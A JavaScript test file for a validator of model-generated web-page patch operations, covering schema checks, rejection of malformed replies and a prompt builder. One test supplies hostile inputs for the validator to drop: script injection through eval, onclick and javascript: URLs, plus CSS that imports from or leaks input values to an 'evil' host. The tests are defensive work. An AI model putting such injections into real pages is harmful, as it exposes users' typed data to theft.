import test from "node:test";
import assert from "node:assert/strict";
import { Schema, Ops, Prompt } from "./helpers.mjs";

const { validatePatchResponse, RESPONSE_SCHEMA, OP_SCHEMAS } = Schema;

test("schema op types match the engine vocabulary", () => {
  const schemaTypes = OP_SCHEMAS.map((s) => s.properties.type.const).sort();
  assert.deepEqual(schemaTypes, [...Ops.OP_TYPES].sort());
  assert.deepEqual(Schema.BLOCKABLE_EVENTS, Ops.BLOCKABLE_EVENTS);
  assert.deepEqual(Schema.WRAP_TAGS, Ops.WRAP_TAGS);
  assert.equal(RESPONSE_SCHEMA.additionalProperties, false);
});

test("accepts a valid response", () => {
  const v = validatePatchResponse(
    JSON.stringify({
      description: "Lets you paste.",
      ops: [
        { type: "unblockEvents", selector: "input", events: ["paste"] },
        { type: "addCSS", css: "body{font-size:16px!important}" },
        { type: "setStyle", selector: ".a", props: { width: "auto", "z-index": 3 } },
        { type: "wrap", selector: ".a", tag: "div" },
      ],
    })
  );
  assert.equal(v.ok, true);
  assert.equal(v.patch.ops.length, 4);
  assert.equal(v.patch.ops[2].props["z-index"], "3");
  assert.equal(v.patch.ops[3].group, false);
});

test("accepts JSON inside a code fence", () => {
  const v = validatePatchResponse('```json\n{"description":"x","ops":[{"type":"hide","selector":".ad"}]}\n```');
  assert.equal(v.ok, true);
});

test("rejects malformed responses", () => {
  assert.equal(validatePatchResponse("not json").ok, false);
  assert.equal(validatePatchResponse("[]").ok, false);
  assert.equal(validatePatchResponse('{"ops":[]}').ok, false);
  assert.equal(validatePatchResponse('{"description":"x","ops":{}}').ok, false);
});

test("an empty ops list is a valid 'can't do this' answer", () => {
  const v = validatePatchResponse('{"description":"That needs JavaScript.","ops":[]}');
  assert.equal(v.ok, true);
  assert.equal(v.patch.ops.length, 0);
});

test("drops invalid ops but keeps valid ones", () => {
  const v = validatePatchResponse(
    JSON.stringify({
      description: "x",
      ops: [
        { type: "eval", code: "alert(1)" },
        { type: "setAttribute", selector: "a", attr: "onclick", value: "x()" },
        { type: "setAttribute", selector: "a", attr: "href", value: "javascript:alert(1)" },
        { type: "addCSS", css: "@import url(https://evil/x.css);" },
        { type: "addCSS", css: "input[value^=a]{background:url(https://evil/a)}" },
        { type: "unblockEvents", selector: "input", events: ["input"] },
        { type: "move", selector: "a", targetSelector: "b", position: "inside" },
        { type: "setStyle", selector: "a", props: { width: "1px !important" } },
        { type: "hide", selector: "" },
        { type: "hide", selector: ".ok" },
      ],
    })
  );
  assert.equal(v.ok, true);
  assert.equal(v.patch.ops.length, 1);
  assert.equal(v.dropped.length, 9);
});

test("fails when every op is invalid", () => {
  const v = validatePatchResponse('{"description":"x","ops":[{"type":"eval"}]}');
  assert.equal(v.ok, false);
  assert.match(v.errors[0], /no valid ops/);
});

test("data:image URLs are allowed in addCSS", () => {
  const v = validatePatchResponse('{"description":"x","ops":[{"type":"addCSS","css":"a{background:url(\\"data:image/png;base64,AA\\")}"}]}');
  assert.equal(v.ok, true);
});

test("prompt builder includes the screenshot, draft and retry feedback", () => {
  const m = Prompt.buildMessages({
    instruction: "make it fit my phone",
    summary: "URL: x",
    screenshot: "data:image/jpeg;base64,AAA",
    draft: { description: "d", ops: [{ type: "hide", selector: ".a" }], results: [{ type: "hide", matches: 0 }] },
    previousError: { raw: "{}", errors: ["description must be a non-empty string"] },
  });
  assert.equal(m[0].role, "system");
  assert.equal(m[1].content[1].type, "image_url");
  assert.match(m[1].content[0].text, /Current draft/);
  assert.equal(m.length, 4);
  assert.equal(Prompt.wantsScreenshot("make this readable on mobile", "auto"), true);
  assert.equal(Prompt.wantsScreenshot("let me paste my password", "auto"), false);
  assert.equal(Prompt.wantsScreenshot("let me paste my password", "always"), true);
  assert.equal(Prompt.wantsScreenshot("fix the layout", "never"), false);
});

test("system prompt examples are themselves valid patches", () => {
  const examples = Prompt.SYSTEM_PROMPT.match(/^\{"description".*\}$/gm);
  assert.equal(examples.length, 3);
  for (const ex of examples) {
    const v = validatePatchResponse(ex);
    assert.equal(v.ok, true, ex);
    assert.equal(v.dropped.length, 0, JSON.stringify(v.dropped));
  }
});
